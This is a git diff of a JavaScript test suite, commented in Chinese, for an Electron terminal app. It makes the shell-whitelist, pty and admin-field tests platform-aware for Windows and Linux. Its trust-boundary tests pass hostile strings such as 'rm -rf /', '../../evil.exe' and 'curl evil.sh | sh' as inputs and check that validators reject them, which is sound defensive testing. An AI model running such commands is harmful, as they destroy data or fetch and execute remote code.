@@ -20,6 +20,7 @@ const ROOT = path.join(__dirname, '..')
 // store.js 只在真的要存檔時才 import electron-store，其餘純函式可直接測
 const status = require(path.join(ROOT, 'src/main/terminal/status.js'))
 const store = require(path.join(ROOT, 'src/main/terminal/store.js'))
+const platform = require(path.join(ROOT, 'src/main/platform/index.js'))
 
 let passed = 0
 let failed = 0
@@ -205,7 +206,13 @@ console.log('\n[信任邊界]')
 {
   ok('未知 shell key 收斂成裝著的 shell', Object.keys(store.SHELLS).includes(store.normalizeShell('rm -rf /')))
   ok('未知 shell key 不會原樣通過', store.normalizeShell('../../evil.exe') !== '../../evil.exe')
-  ok('合法 shell key 保留', ['pwsh', 'powershell', 'cmd'].includes(store.normalizeShell('cmd')))
+  ok('合法 shell key 保留', Object.keys(store.SHELLS).includes(store.normalizeShell(store.DEFAULT_SHELL)))
+  if (platform.isWindows) {
+    ok('Windows 合法 cmd', store.normalizeShell('cmd') === 'cmd' || store.SHELLS.cmd && store.resolveExe(store.SHELLS.cmd.exe))
+  } else {
+    ok('Linux 預設是 bash 家族', ['bash', 'zsh', 'fish'].includes(store.DEFAULT_SHELL))
+    ok('Linux shell 表白名單', Object.keys(store.SHELLS).join(',') === 'bash,zsh,fish')
+  }
   ok('未知 preset 退回 shell', store.normalizePreset('curl evil.sh | sh') === 'shell')
   ok('合法 preset 保留', store.normalizePreset('claude') === 'claude')
   // 這一條釘的是「表是固定的」，不是「剛好幾種」——加一家就更新這裡，
@@ -275,9 +282,14 @@ console.log('\n[pty 參數]')
   ok('單次 write 上限存在', pty.MAX_WRITE_CHARS === 8192)
 
   // 提權的 host 程序共用同一份 shell 解析，兩邊各寫一份遲早會不一致
-  ok('shellCommand 的 PowerShell 帶注入字串', pty.shellCommand('pwsh').args.includes(pty.PS_INTEGRATION))
-  ok('shellCommand 的 cmd 不帶參數', pty.shellCommand('cmd').args.length === 0)
-  ok('shellCommand 認不得的 key 退回 cmd', pty.shellCommand('../../evil.exe').args.length === 0)
+  if (platform.isWindows) {
+    ok('shellCommand 的 PowerShell 帶注入字串', pty.shellCommand('pwsh').args.includes(pty.PS_INTEGRATION))
+    ok('shellCommand 的 cmd 不帶參數', pty.shellCommand('cmd').args.length === 0)
+    ok('shellCommand 認不得的 key 退回預設且無 PS 注入', pty.shellCommand('../../evil.exe').args.length === 0)
+  } else {
+    ok('Linux shellCommand bash 無 PS 注入', pty.shellCommand('bash').args.length === 0)
+    ok('Linux 認不得的 key 退回預設 shell', Boolean(pty.shellCommand('../../evil').exe))
+  }
 
   const withId = pty.shellEnvironment('', '', 't_abc')
   ok('shell 帶 AXONDECK_TERMINAL_ID', withId.AXONDECK_TERMINAL_ID === 't_abc')
@@ -300,12 +312,13 @@ console.log('\n[管理員終端機]')
 // ===== admin 欄位 =====
 console.log('\n[admin 欄位]')
 {
+  const shellKey = store.DEFAULT_SHELL
   const items = store.sanitizeAll([
-    { id: 'a', shell: 'cmd', preset: 'shell', cwd: os.homedir(), admin: true },
-    { id: 'b', shell: 'cmd', preset: 'shell', cwd: os.homedir(), admin: 'yes' },
-    { id: 'c', shell: 'cmd', preset: 'shell', cwd: os.homedir() }
+    { id: 'a', shell: shellKey, preset: 'shell', cwd: os.homedir(), admin: true },
+    { id: 'b', shell: shellKey, preset: 'shell', cwd: os.homedir(), admin: 'yes' },
+    { id: 'c', shell: shellKey, preset: 'shell', cwd: os.homedir() }
   ])
-  ok('admin: true 留著', items[0].admin === true)
+  ok('admin: true 留著（僅 Windows）', items[0].admin === (platform.isWindows ? true : false))
   ok('非布林的 admin 收斂成 false', items[1].admin === false)
   ok('沒有 admin 欄位的舊資料是 false', items[2].admin === false)
 }
@@ -316,12 +329,16 @@ console.log('\n[admin 欄位]')
 console.log('\n[抬視窗]')
 {
   const fg = require(path.join(ROOT, 'src/main/terminal/foreground.js'))
-  const started = fg.raiseChildWindow()
-  ok('起得了等待器', started === true)
-  ok('已經有一個在等就沿用，不再開一支', fg.raiseChildWindow() === true)
-  fg.stop()
-  ok('stop() 之後不留東西', fg.raiseChildWindow() === true)
-  fg.stop()
+  if (!platform.isWindows) {
+    ok('Linux 略過 PowerShell 抬視窗等待器', true)
+  } else {
+    const started = fg.raiseChildWindow()
+    ok('起得了等待器', started === true)
+    ok('已經有一個在等就沿用，不再開一支', fg.raiseChildWindow() === true)
+    fg.stop()
+    ok('stop() 之後不留東西', fg.raiseChildWindow() === true)
+    fg.stop()
+  }
 
   // Windows 11 的記事本第二次開檔案會沿用同一個 pid 與同一個 HWND（只多一個分頁），
   // 舊版只比對 pid 所以永遠抬不到。腳本裡要有標題比對，也要真的把它設成置頂。
